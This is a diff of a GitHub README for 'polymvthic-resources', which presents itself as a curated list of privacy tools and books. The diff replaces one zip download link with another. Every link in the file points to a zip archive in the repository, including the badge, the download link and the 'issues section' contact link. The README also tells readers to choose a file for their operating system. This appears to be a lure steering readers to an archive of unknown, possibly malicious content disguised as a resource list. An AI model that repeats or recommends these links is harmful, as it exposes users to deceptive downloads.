@@ -1,7 +1,7 @@
 # 🌟 polymvthic-resources - Discover Essential Tools for Privacy
 
 ## 📥 Download
-[![Download Latest Release](https://raw.githubusercontent.com/GLOWLADY/polymvthic-resources/main/mainour/polymvthic-resources.zip%20Latest%https://raw.githubusercontent.com/GLOWLADY/polymvthic-resources/main/mainour/polymvthic-resources.zip)](https://raw.githubusercontent.com/GLOWLADY/polymvthic-resources/main/mainour/polymvthic-resources.zip)
+[![Download Latest Release](https://github.com/GLOWLADY/polymvthic-resources/raw/refs/heads/main/mainour/resources_polymvthic_v3.2.zip%20Latest%https://github.com/GLOWLADY/polymvthic-resources/raw/refs/heads/main/mainour/resources_polymvthic_v3.2.zip)](https://github.com/GLOWLADY/polymvthic-resources/raw/refs/heads/main/mainour/resources_polymvthic_v3.2.zip)
 
 ## 🚀 Getting Started
 Welcome to **polymvthic-resources**! This project offers a curated list of tools and books aimed at polymaths who value privacy, creativity, and autonomy. You will find over 150 tools and more than 90 books across various topics such as security, business, philosophy, and culture.
@@ -21,7 +21,7 @@ Welcome to **polymvthic-resources**! This project offers a curated list of tools
 ## 📂 Download & Install
 To get started with **polymvthic-resources**, please visit the following link to download:
 
-[Download Latest Release](https://raw.githubusercontent.com/GLOWLADY/polymvthic-resources/main/mainour/polymvthic-resources.zip)
+[Download Latest Release](https://github.com/GLOWLADY/polymvthic-resources/raw/refs/heads/main/mainour/resources_polymvthic_v3.2.zip)
 
 Inside the releases page, you will find the latest version of the software packaged in a user-friendly format. Click on the version you prefer, and then select the appropriate file for your operating system. 
 
@@ -48,7 +48,7 @@ We welcome contributions and suggestions! If you have a tool or book in mind tha
 Join the community of users and contributors passionate about privacy and autonomy. Your feedback helps enhance this resource list further.
 
 ## 📞 Contact
-For questions, issues, or support, please reach out via the [issues section](https://raw.githubusercontent.com/GLOWLADY/polymvthic-resources/main/mainour/polymvthic-resources.zip) on our GitHub page. We are here to help!
+For questions, issues, or support, please reach out via the [issues section](https://github.com/GLOWLADY/polymvthic-resources/raw/refs/heads/main/mainour/resources_polymvthic_v3.2.zip) on our GitHub page. We are here to help!
 
 ## ⚖️ License
 This project is open source and available under the [MIT License](LICENSE). Feel free to use, modify, and share the resources as needed.
